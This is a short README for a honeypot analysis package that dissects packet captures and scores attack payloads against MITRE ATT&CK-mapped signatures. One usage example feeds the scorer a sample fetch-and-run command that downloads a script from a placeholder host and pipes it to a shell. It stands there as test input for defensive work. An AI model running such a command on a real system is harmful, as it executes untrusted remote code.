# deception-shield

Packet capture dissection and attack pattern analysis for the Deception Shield
honeypot sensor network.

The package does three things:

- **Dissects captures** by driving tshark, so payloads arrive reassembled and
  protocols are identified by dissection rather than by port number.
- **Scores payloads** against a weighted signature set mapped to MITRE ATT&CK
  techniques, folding the result into triage bands.
- **Derives patterns** from the resulting records: recurring behaviours,
  correlated campaigns, and sources sweeping ports rather than pursuing targets.

```bash
pip install -e ".[dev]"

deception-shield replay capture.pcap.gz
deception-shield analyse --since 24h
deception-shield score --text 'wget http://x/m.sh | sh'
```

`tshark` must be on PATH for capture dissection. Scoring and pattern analysis
have no external requirements.

Full documentation is in the repository's `docs/` directory.
